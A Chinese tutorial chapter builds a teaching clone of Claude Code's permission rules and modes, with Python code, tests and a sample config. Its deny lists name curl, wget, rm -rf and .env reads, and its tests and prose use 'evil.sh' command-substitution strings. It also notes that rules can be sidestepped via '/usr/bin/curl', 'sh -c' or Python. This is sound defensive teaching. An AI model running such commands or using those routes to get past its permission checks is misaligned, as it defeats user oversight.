# 第 3 章：权限系统，模型想做和能不能做是两回事

## 导读

第 2 章的 agent 每次要改文件、跑命令都会问你。问得太多，你很快就会不看内容直接按 `y`，这比不问还危险；完全不问，模型的一次误判就可能删掉重要文件。

Claude Code 用一套**权限规则 + 权限模式**解决这个矛盾：常用的安全操作写成规则自动放行，危险的写成规则直接禁止，剩下的才问你；不同的工作阶段切换不同的模式。这一章把这套机制实现出来。

学完你会有：

- `minicode/settings.py`：读取并合并用户级、项目级、本地级三层配置。
- `minicode/permissions.py`：规则解析、命令拆分、路径匹配、五种权限模式，以及“总是允许”的记忆。
- 能回答：`Bash(git *)` 会不会放行 `git log && rm -rf x`？为什么 deny 规则要放在最前面？

## Claude Code 是怎么做的

以下内容来自 Claude Code 的[权限文档](https://code.claude.com/docs/en/permissions)和 [Agent SDK 权限文档](https://code.claude.com/docs/en/agent-sdk/permissions)。

### 权限模式

| 模式 | 行为 |
| --- | --- |
| `default` | 每种工具第一次使用时询问 |
| `acceptEdits` | 自动接受工作目录内的文件修改，以及 `mkdir`、`touch`、`mv`、`cp` 这类常见文件命令 |
| `plan` | 只读调研、写计划，不修改源文件 |
| `auto` | 不例行询问，由一个后台分类模型审查 shell 命令和网络请求 |
| `dontAsk` | 凡是需要询问的一律自动拒绝，只有预先允许的操作能执行 |
| `bypassPermissions` | 跳过询问，但少数没有任何模式会自动批准的操作（比如写 `.git`、`.claude` 这类受保护路径）仍然会问 |

### 规则和检查顺序

规则写成 `工具名` 或 `工具名(内容)`，分成 allow、ask、deny 三组，写在 settings 文件里。官方文档对顺序的说明是：

> Rules are evaluated in order: deny, then ask, then allow. The first match in that order determines the outcome, and rule specificity doesn't change the order.

也就是说，宽泛的 `deny: Bash(aws *)` 会压过更具体的 `allow: Bash(aws s3 ls)`。规则写得再具体，也改变不了这个顺序。

SDK 文档把完整的检查顺序列成了六步：hooks → deny 规则 → ask 规则 → 权限模式 → allow 规则 → 询问用户的回调。两个要点：**deny 规则在任何模式下都生效，连 `bypassPermissions` 也不例外；hook 返回 allow 也跳不过 deny 和 ask 规则。**

### 规则的写法

| 规则 | 含义 |
| --- | --- |
| `Bash(git diff *)` | 以 `git diff` 开头的命令。`*` 匹配任意文本，包括空格；`Bash(ls *)` 匹配 `ls` 和 `ls -la`，但不匹配 `lsof` |
| `Bash(npm run test:*)` | 旧写法，结尾的 `:*` 等同于 ` *` |
| `Read(.env)` | 任何目录下叫 `.env` 的文件（不带 `/` 的名字在任何深度都匹配） |
| `Edit(src/**)` | 当前目录下 `src` 里的所有文件。`//` 开头是绝对路径，`~/` 是家目录，`/` 开头相对于项目根目录 |
| `WebFetch(domain:example.com)` | 访问这个域名 |
| `mcp__github` | 某个 MCP 服务器的所有工具 |

**复合命令会被拆开检查。** 文档列出的分隔符有 `&&`、`||`、`;`、`|`、`|&`、`&` 和换行，并且明确要求：每一个子命令都被允许，整条命令才能免确认执行。所以 `Bash(git *)` 不会放行 `git log && rm -rf x`。

**内置的只读命令不用问。** 文档的表格写明 Bash 需要确认，“except a built-in set of read-only commands”：`ls`、`cat`、`echo`、`pwd`、`head`、`tail`、`grep`、`find`、`wc`、`which`、`diff`、`stat`、`du`、`cd` 和只读的 git 命令。

**规则拦不住所有写法。** 文档自己也承认：`Bash(curl *)` 拦不住 `/usr/bin/curl`、`sh -c 'curl ...'`。字符串匹配挡得住手滑，挡不住刻意绕路，所以 Claude Code 还有沙箱（第 11 章）。

### 工作目录

读文件在工作目录（和用 `--add-dir` 加进来的目录）里不用问，出了工作目录就要问。文件修改也只在工作目录内才会被 `acceptEdits` 自动接受。

### 配置分层

| 层级 | 文件 | 作用范围 |
| --- | --- | --- |
| 用户级 | `~/.claude/settings.json` | 你的所有项目 |
| 项目级 | `.claude/settings.json` | 提交到 git，团队共享 |
| 本地级 | `.claude/settings.local.json` | 只对你自己生效 |

优先级从高到低是：企业管理配置、命令行参数、本地级、项目级、用户级。**列表类的配置（比如 `permissions.allow`）是合并的，不是覆盖**；而且任何一层的 deny 都压过任何一层的 allow。

## 第 1 步：读配置

minicode 的配置目录叫 `.minicode`，结构和 Claude Code 的 `.claude` 一一对应。新建 `minicode/settings.py`：

```python
"""读取并合并三层配置，对应 Claude Code 的 user / project / local settings。

    ~/.minicode/settings.json              用户级：你的所有项目
    <项目>/.minicode/settings.json          项目级：提交到 git，团队共享
    <项目>/.minicode/settings.local.json    本地级：只对你自己生效，加进 .gitignore

列表（权限规则、hooks）合并，单个值（比如 defaultMode）后面的覆盖前面的。
命令行参数优先级最高，由调用方最后再覆盖。
"""
import json
import re
from pathlib import Path

CONFIG_DIR = ".minicode"


def project_dir(cwd: Path, home: Path | None = None) -> Path:
    """每个项目在家目录下的私有目录：放会话记录和自动记忆。名字由路径转换而来，/ 变成 -。"""
    return (home or Path.home()) / CONFIG_DIR / "projects" / re.sub(r"[^\w.-]", "-", str(cwd))


def settings_files(cwd: Path, home: Path | None = None) -> list[Path]:
    home = home or Path.home()
    return [home / CONFIG_DIR / "settings.json",
            cwd / CONFIG_DIR / "settings.json",
            cwd / CONFIG_DIR / "settings.local.json"]


def load_settings(cwd: Path, home: Path | None = None) -> dict:
    merged = {"permissions": {"allow": [], "ask": [], "deny": []}, "hooks": {}}
    for path in settings_files(cwd, home):
        if not path.exists():
            continue
        try:
            data = json.loads(path.read_text(encoding="utf-8"))
        except json.JSONDecodeError as e:
            raise SystemExit(f"配置文件 {path} 不是合法的 JSON：{e}")
        perms = data.get("permissions", {})
        for kind in ("allow", "ask", "deny"):
            merged["permissions"][kind] += perms.get(kind, [])
        for key, value in perms.items():
            if key not in ("allow", "ask", "deny"):        # defaultMode、additionalDirectories 等
                merged["permissions"][key] = value
        for event, groups in data.get("hooks", {}).items():
            merged["hooks"].setdefault(event, []).extend(groups)
        for key, value in data.items():
            if key not in ("permissions", "hooks"):
                merged[key] = value
    return merged
```

`project_dir` 现在还用不上，第 5、6 章的自动记忆和会话记录会用它。

## 第 2 步：权限引擎

新建 `minicode/permissions.py`：

```python
"""权限系统：一次工具调用是直接放行、拒绝，还是问用户？

规则写法和 Claude Code 一致：工具名，或者 工具名(内容)。
    Bash(git diff *)        命令以 git diff 开头
    Read(.env)              任何目录下叫 .env 的文件
    Edit(src/**)            工作目录下 src 里的所有文件（Edit 规则同时管 Edit 和 Write）
    WebFetch(domain:*.github.com)
    mcp__labnotes           某个 MCP 服务器的所有工具
检查顺序也和 Claude Code 一致：deny 规则 → ask 规则 → 权限模式 → allow 规则 → 工具的默认行为。
第一个命中的就是结果，所以再宽的 allow 也打不穿 deny。
"""
import fnmatch
import json
import re
from pathlib import Path

from .tool import Decision

MODES = ("default", "acceptEdits", "plan", "dontAsk", "bypassPermissions")
READ_TOOLS = {"Read", "Glob", "Grep"}          # Read(...) 规则管这三个工具
EDIT_TOOLS = {"Edit", "Write"}                 # Edit(...) 规则管这两个工具
SEPARATORS = re.compile(r"\|\||&&|\|&|[;|&\n]")
WRAPPERS = {"timeout", "time", "nice", "nohup"}
READ_ONLY_COMMANDS = {"ls", "pwd", "cat", "head", "tail", "wc", "echo", "which", "diff", "stat", "du", "grep",
                      "git status", "git diff", "git log", "git show"}


def parse_rule(text: str) -> tuple[str, str | None]:
    """'Bash(git diff *)' -> ('Bash', 'git diff *')；'Read' -> ('Read', None)"""
    m = re.fullmatch(r"\s*([^()\s]+)\s*(?:\((.*)\))?\s*", text)
    if not m:
        raise ValueError(f"看不懂的权限规则：{text}")
    return m.group(1), m.group(2)


def split_command(command: str) -> list[str]:
    """把 a && b | c 拆成子命令，并去掉 timeout、nohup 这类不改变命令本身的前缀。"""
    parts = []
    for part in SEPARATORS.split(command):
        words = part.split()
        while words and words[0] in WRAPPERS:
            words = words[1:]
            if words and words[0].replace(".", "").isdigit():   # timeout 30 cmd
                words = words[1:]
        if words:
            parts.append(" ".join(words))
    return parts


def match_command(pattern: str, command: str) -> bool:
    """* 匹配任意文本；结尾的 ' *'（或旧写法 ':*'）表示“这个前缀，后面可以有参数，也可以没有”。"""
    if pattern.endswith(":*"):
        pattern = pattern[:-2] + " *"
    optional_tail = pattern.endswith(" *")
    body = pattern[:-2] if optional_tail else pattern
    regex = ".*".join(re.escape(piece) for piece in body.split("*"))
    if optional_tail:
        regex += r"(?: .*)?"
    return re.fullmatch(regex, command, re.DOTALL) is not None


def glob_to_regex(pattern: str) -> str:
    out, i = "", 0
    while i < len(pattern):
        if pattern.startswith("**/", i):
            out, i = out + "(?:.*/)?", i + 3
        elif pattern.startswith("**", i):
            out, i = out + ".*", i + 2
        elif pattern[i] == "*":
            out, i = out + "[^/]*", i + 1
        elif pattern[i] == "?":
            out, i = out + "[^/]", i + 1
        else:
            out, i = out + re.escape(pattern[i]), i + 1
    return out


def match_path(pattern: str, path: str, cwd: Path) -> bool:
    """//绝对路径  ~/家目录  /项目根目录（这里就是工作目录）  其他按工作目录；不带 / 的名字在任何深度都算。"""
    if "/" not in pattern:
        return fnmatch.fnmatch(Path(path).name, pattern)
    if pattern.startswith("//"):
        full = pattern[1:]
    elif pattern.startswith("~/"):
        full = str(Path.home()) + pattern[1:]
    elif pattern.startswith("/"):
        full = str(cwd) + pattern
    else:
        full = str(cwd / pattern.removeprefix("./"))
    return re.fullmatch(glob_to_regex(full), path) is not None


def is_read_only_command(command: str) -> bool:
    """整条命令的每个子命令都在只读名单里，而且没有重定向和命令替换，才算只读。"""
    if re.search(r"[<>`]|\$\(", command):
        return False
    parts = split_command(command)
    return bool(parts) and all(
        any(match_command(f"{safe} *", p) for safe in READ_ONLY_COMMANDS) for p in parts)


class PermissionEngine:
    def __init__(self, mode: str = "default", allow=(), ask=(), deny=(),
                 workdirs=(), persist_to: Path | None = None):
        if mode not in MODES:
            raise ValueError(f"未知的权限模式 {mode}，可选：{MODES}")
        self.mode = mode
        self.rules = {"allow": list(allow), "ask": list(ask), "deny": list(deny)}
        self.workdirs = [Path(d).resolve() for d in workdirs]
        self.persist_to = persist_to       # “总是允许”的规则写到哪个 settings 文件

    def check(self, tool, args: dict, ctx, hook_decision: str | None = None) -> Decision:
        key = tool.permission_key(args, ctx)
        if rule := self._first("deny", tool, key, ctx):
            return Decision("deny", f"命中 deny 规则 {rule}")
        if rule := self._first("ask", tool, key, ctx):
            return self._ask(f"命中 ask 规则 {rule}")
        if hook_decision == "ask":
            return self._ask("hook 要求确认")
        if self.mode == "bypassPermissions":
            return Decision("allow", "bypassPermissions 模式")
        if self.mode == "plan" and not tool.read_only:
            return Decision("deny", "plan 模式下只能调研、不能修改。计划写好后用 ExitPlanMode 提交给用户批准")
        if rule := self._first("allow", tool, key, ctx):
            return Decision("allow", f"命中 allow 规则 {rule}")
        if hook_decision == "allow":
            return Decision("allow", "hook 放行")

        # 没有任何规则命中，按工具自己的情况决定
        inside = key is not None and self.inside(key)
        if tool.name in READ_TOOLS:
            return Decision("allow", "工作目录内的只读操作") if inside else self._ask(f"{key} 在工作目录之外")
        if not tool.needs_permission:
            return Decision("allow", "这个工具不需要权限")
        if tool.name in EDIT_TOOLS and not inside:
            return self._ask(f"{key} 在工作目录之外")
        if tool.name in EDIT_TOOLS and self.mode == "acceptEdits":
            return Decision("allow", "acceptEdits 模式自动接受工作目录内的修改")
        if tool.name == "Bash" and is_read_only_command(key):
            return Decision("allow", "只读命令")
        return self._ask(f"{tool.name} 需要你确认")

    def _ask(self, reason: str) -> Decision:
        # dontAsk 模式没有人可问：凡是需要确认的，一律拒绝
        return Decision("deny", f"{reason}（dontAsk 模式不询问，直接拒绝）") if self.mode == "dontAsk" \
            else Decision("ask", reason)

    def _first(self, kind: str, tool, key: str | None, ctx) -> str | None:
        for rule in self.rules[kind]:
            if self._matches(kind, rule, tool, key, ctx.cwd):
                return rule
        return None

    def _matches(self, kind: str, rule: str, tool, key: str | None, cwd: Path) -> bool:
        name, spec = parse_rule(rule)
        if name == "Read" and tool.name in READ_TOOLS or name == "Edit" and tool.name in EDIT_TOOLS:
            return spec is None or (key is not None and match_path(spec, key, cwd))
        if name.startswith("mcp__") and name.count("__") == 1:     # mcp__server：这个服务器的全部工具
            return tool.name.startswith(name + "__")
        if not fnmatch.fnmatchcase(tool.name, name):
            return False
        if spec is None:
            return True
        if key is None:
            return False
        if tool.name == "Bash":
            parts = split_command(key)
            if kind == "allow":                             # allow：每个子命令都得被允许，且不能有命令替换
                return bool(parts) and all(match_command(spec, p) for p in parts) \
                    and not re.search(r"`|\$\(", key)
            return any(match_command(spec, p) for p in parts)  # deny/ask：任何一个子命令命中就算
        if spec.startswith("domain:"):
            return fnmatch.fnmatch(key.lower(), spec[len("domain:"):].lower())
        return fnmatch.fnmatch(key, spec)

    def inside(self, path: str) -> bool:
        p = Path(path)
        return any(p == d or p.is_relative_to(d) for d in self.workdirs)

    def remember(self, tool, args: dict, ctx) -> None:
        """用户选了“总是允许”：本次会话立刻生效，并写进 settings.local.json。"""
        rule = suggest_rule(tool, tool.permission_key(args, ctx))
        if rule == "acceptEdits":
            self.mode = "acceptEdits" if self.mode == "default" else self.mode
            return
        self.rules["allow"].append(rule)
        if self.persist_to:
            data = json.loads(self.persist_to.read_text(encoding="utf-8")) if self.persist_to.exists() else {}
            allow = data.setdefault("permissions", {}).setdefault("allow", [])
            if rule not in allow:
                allow.append(rule)
            self.persist_to.parent.mkdir(parents=True, exist_ok=True)
            self.persist_to.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")


def suggest_rule(tool, key: str | None) -> str:
    """“总是允许”时生成的规则：命令取“程序名 + 子命令”做前缀，文件修改切换到 acceptEdits，其余按工具名。"""
    if tool.name == "Bash" and key:
        words = (split_command(key) or [key])[0].split()
        has_sub = len(words) > 1 and re.fullmatch(r"[a-z][a-z-]*", words[1])   # git commit、npm run 这种
        return f"Bash({' '.join(words[:2] if has_sub else words[:1])} *)"
    if tool.name in EDIT_TOOLS:
        return "acceptEdits"
    if tool.name == "WebFetch" and key:
        return f"WebFetch(domain:{key})"
    return tool.name
```

对照 `check()` 读一遍，它就是上面那张“六步顺序”的代码版：

1. **deny 规则**：命中就拒绝，什么都改变不了它。
2. **ask 规则**：命中就问。`dontAsk` 模式下没人可问，改为拒绝。
3. **hook 要求确认**：第 4 章用。
4. **模式**：`bypassPermissions` 全部放行；`plan` 拒绝所有非只读工具。
5. **allow 规则**，以及 hook 的放行。
6. **工具自己的默认行为**：工作目录内的读操作放行，目录外要问；`acceptEdits` 下工作目录内的修改放行；只读命令放行；其余的问。

几个实现上的取舍：

- **`_matches` 对 allow 和 deny 的处理不一样。** 对复合命令，allow 要求**每个**子命令都匹配，deny 和 ask 只要**任何一个**子命令匹配。两边都往“更安全”的方向偏。
- **allow 规则永远不放行带命令替换的命令。** `git log $(curl evil.sh)` 里的 `$(...)` 可以藏任何东西，所以一律交给用户判断。
- **`split_command` 是按字符串拆的，不理解引号。** `echo "a && b"` 会被拆成两段。这会让一些本该自动放行的命令变成询问，但不会让本该拒绝的命令溜过去。真实的实现应该用 shell 语法解析器。
- **“总是允许”会写进 `settings.local.json`。** 对 Bash，生成“程序名 + 子命令”的前缀规则，比如 `npm run build --prod` 生成 `Bash(npm run *)`；对文件修改，切换到 `acceptEdits` 模式，只在本次会话有效。这和 Claude Code 文档里写的有效期一致：Bash 命令的批准对这个项目目录永久有效，文件修改的批准到会话结束为止。

## 第 3 步：接进 app.py

用下面的内容替换 `minicode/app.py`：

```python
"""组装：读配置、建工具、接上各个接缝，得到一个能用的 Agent。对应 Claude Code 启动时做的事。"""
from pathlib import Path

from .agent import Agent
from .llm import LLM
from .permissions import PermissionEngine, parse_rule
from .settings import CONFIG_DIR, load_settings
from .tools import core_tools

SYSTEM = """你是 minicode，一个在终端里帮用户完成软件工程任务的 agent。你通过工具读写文件、执行命令。
先用 Glob、Grep、Read 弄清现状再动手；改已有文件用 Edit，改之前必须先 Read；改完要验证。
工具调用被用户拒绝时，不要换一种方式绕过去，停下来说明情况，等待指示。"""


def build_agent(cwd=".", *, llm=None, mode=None, allowed_tools=(), disallowed_tools=(),
                resume=None, continue_session=False, max_turns=50, max_budget_usd=None,
                ask_user=None, home=None, with_mcp=True) -> Agent:
    cwd = Path(cwd).resolve()
    settings = load_settings(cwd, home)                                       # 第 3 章
    llm = llm or LLM(model=settings.get("model"))
    perms = settings["permissions"]
    permissions = PermissionEngine(
        mode or perms.get("defaultMode", "default"),
        allow=perms["allow"] + list(allowed_tools), ask=perms["ask"], deny=perms["deny"] + list(disallowed_tools),
        workdirs=[cwd, *perms.get("additionalDirectories", [])],
        persist_to=cwd / CONFIG_DIR / "settings.local.json")

    tools = core_tools()
    removed = {parse_rule(r)[0] for r in permissions.rules["deny"] if parse_rule(r)[1] is None}
    tools = [t for t in tools if t.name not in removed]       # deny 里只写工具名 = 让模型根本看不到这个工具
    return Agent(llm, tools, SYSTEM, cwd=cwd, max_turns=max_turns, permissions=permissions, ask_user=ask_user)
```

两处变化：

- 用配置和命令行参数创建 `PermissionEngine`，交给 `Agent`。主循环里的 `self.permissions` 接缝从这里开始生效。
- **只写工具名、不带括号的 deny 规则，会把这个工具从工具列表里拿掉**，模型根本看不到它。Claude Code 也是这样处理的：与其让模型调用了再拒绝，不如一开始就不给。

## 跑起来

在 `playground/.minicode/settings.json` 里写一份项目配置：

```bash
mkdir -p playground/.minicode
```

```bash
cat > playground/.minicode/settings.json <<'EOF'
{
  "permissions": {
    "allow": ["Bash(python *)", "Bash(git status *)"],
    "ask": ["Bash(git commit *)"],
    "deny": ["Bash(rm -rf *)", "Read(.env)", "Bash(curl *)", "Bash(wget *)"]
  }
}
EOF
```

```bash
echo "API_KEY=sk-do-not-leak" > playground/.env
```

```bash
uv run python -m minicode --cwd playground
```

依次试这几件事，观察每一次决定来自哪一步：

| 输入 | 应该看到 | 来自哪一步 |
| --- | --- | --- |
| `运行 test_stats.py` | 不问，直接执行 | allow 规则 `Bash(python *)` |
| `列出当前目录的文件，并显示 git 状态` | Glob 和 `ls` 都不问 | 只读工具、只读命令 |
| `读一下 .env` | “权限不允许：命中 deny 规则 Read(.env)” | deny 规则 |
| `用 curl 下载 https://example.com` | 被拒绝 | deny 规则 |
| `新建 notes.md 写一句话`，回答 `a` | 这次执行，并切换到 acceptEdits；之后的修改不再问 | “总是允许” |
| 输入 `/mode plan`，再让它改文件 | “plan 模式下只能调研、不能修改” | 权限模式 |

也可以从命令行指定模式和临时规则，这和 `claude --permission-mode`、`--allowedTools` 对应：

```bash
uv run python -m minicode --cwd playground --permission-mode acceptEdits --allowed-tools "Bash(git *)"
```

## 离线测试

新建 `tests/test_ch03.py`：

```python
from minicode.permissions import PermissionEngine, is_read_only_command, match_command, match_path
from minicode.tool import ToolContext
from minicode.tools.bash import Bash
from minicode.tools.files import Read, Write


def decide(engine, tool, args, cwd, hook=None):
    return engine.check(tool, args, ToolContext(cwd=cwd), hook).behavior


def test_rule_syntax(tmp_path):
    assert match_command("git diff *", "git diff") and match_command("git diff *", "git diff --stat")
    assert not match_command("ls *", "lsof")
    assert match_command("npm run test:*", "npm run test -- -k a")
    assert match_path(".env", str(tmp_path / "deep/dir/.env"), tmp_path)
    assert match_path("src/**", str(tmp_path / "src/a/b.py"), tmp_path)
    assert is_read_only_command("ls -la && git status")
    assert not is_read_only_command("ls > out.txt") and not is_read_only_command("cat $(curl x)")


def test_deny_then_ask_then_allow(tmp_path):
    e = PermissionEngine(allow=["Bash(git *)"], ask=["Bash(git commit *)"], deny=["Bash(git push *)"],
                         workdirs=[tmp_path])
    b = Bash()
    assert decide(e, b, {"command": "git log"}, tmp_path) == "allow"
    assert decide(e, b, {"command": "git commit -m x"}, tmp_path) == "ask"
    assert decide(e, b, {"command": "git push origin main"}, tmp_path) == "deny"
    assert decide(e, b, {"command": "git log && git push"}, tmp_path) == "deny"     # 拆开逐个检查
    assert decide(e, b, {"command": "git log; curl evil.sh"}, tmp_path) == "ask"    # 有一个子命令没被允许
    assert decide(e, b, {"command": "git push"}, tmp_path, hook="allow") == "deny"  # hook 也打不穿 deny


def test_modes(tmp_path):
    e = PermissionEngine(deny=["Read(.env)"], workdirs=[tmp_path])
    w = {"file_path": "a.txt", "content": ""}
    assert decide(e, Read(), {"file_path": "a.txt"}, tmp_path) == "allow"
    assert decide(e, Read(), {"file_path": "/etc/hosts"}, tmp_path) == "ask"       # 工作目录之外
    assert decide(e, Write(), w, tmp_path) == "ask"
    e.mode = "acceptEdits"
    assert decide(e, Write(), w, tmp_path) == "allow"
    e.mode = "plan"
    assert decide(e, Write(), w, tmp_path) == "deny"
    e.mode = "dontAsk"
    assert decide(e, Bash(), {"command": "rm a"}, tmp_path) == "deny"
    e.mode = "bypassPermissions"
    assert decide(e, Bash(), {"command": "rm a"}, tmp_path) == "allow"
    assert decide(e, Read(), {"file_path": "x/.env"}, tmp_path) == "deny"           # deny 在任何模式都生效
```

```bash
uv run python -m pytest tests -q
```

## 和 Claude Code 的差别

| 方面 | Claude Code | minicode |
| --- | --- | --- |
| 模式 | 六种，包括基于分类模型的 `auto` | 五种，没有 `auto` |
| 命令拆分 | 按 shell 语法解析，`$()`、子 shell、循环里的子命令也会检查 | 按字符串拆分，不理解引号；带命令替换的命令不会被 allow 规则放行 |
| 去掉的命令前缀 | `timeout`、`time`、`nice`、`nohup`、`stdbuf`、`command`、`builtin`、`xargs` | 只去掉前四个 |
| `/` 开头的路径规则 | 相对于定义这条规则的配置文件所在的项目 | 相对于工作目录 |
| 路径规则的细节 | gitignore 语法，支持 `!` 取反，处理符号链接 | 简化的通配符，不支持取反 |
| 受保护路径 | `.git`、`.claude` 等在任何模式下写入都要确认 | 没有（见进阶练习 2） |
| 配置层级 | 还有企业管理配置，且项目里的 allow 规则要在信任这个目录之后才生效 | 三层，没有信任机制 |

## 自检清单

- [ ] 能背出检查顺序，并解释为什么 deny 必须在 allow 前面。
- [ ] 能说出 `Bash(git *)` 遇到 `git log && rm -rf x`、`git log $(curl x)`、`sh -c "git push"` 时分别是什么结果，以及为什么。
- [ ] 能写出一份配置：允许跑测试和看 git 状态，禁止读密钥文件和发网络请求。
- [ ] 知道 `dontAsk` 模式适合什么场景（提示：第 11 章的评测和 CI）。

## 常见坑

| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 写了 `Bash(git)` 却放行不了 `git status` | 没有 `*`，只匹配完全相同的命令 `git` | 写 `Bash(git *)` |
| `Bash(ls*)` 意外放行了 `lsof` | `*` 前面没有空格，不要求单词边界 | 写 `Bash(ls *)` |
| 配置文件改了不生效 | JSON 写错了，或者放错了目录 | 配置在 `--cwd` 指向的目录下的 `.minicode/` 里 |
| 以为 deny 了 `curl` 就安全了 | 模型可以用 Python、`sh -c` 等方式发请求 | 规则只是第一道防线；见第 11 章的沙箱 |
| 总是允许之后想撤销 | 规则写进了 `settings.local.json` | 编辑或删除这个文件 |

## 进阶练习

1. 用 Python 标准库的 `shlex` 改进 `split_command`，让它理解引号。想一想 `shlex` 能不能识别 `&&`。
2. 加“受保护路径”：不管什么模式，写 `.git/` 和 `.minicode/` 下的文件都要问。
3. 实现 `Edit(!docs/**)` 这样的取反规则。
4. 给 `/mode` 命令加上快捷切换：输入 `/mode` 不带参数时，在 default → acceptEdits → plan 之间循环。

## 资料来源

- [Claude Code: Configure permissions](https://code.claude.com/docs/en/permissions)
- [Agent SDK: Configure permissions](https://code.claude.com/docs/en/agent-sdk/permissions)
- [Claude Code settings](https://code.claude.com/docs/en/settings)
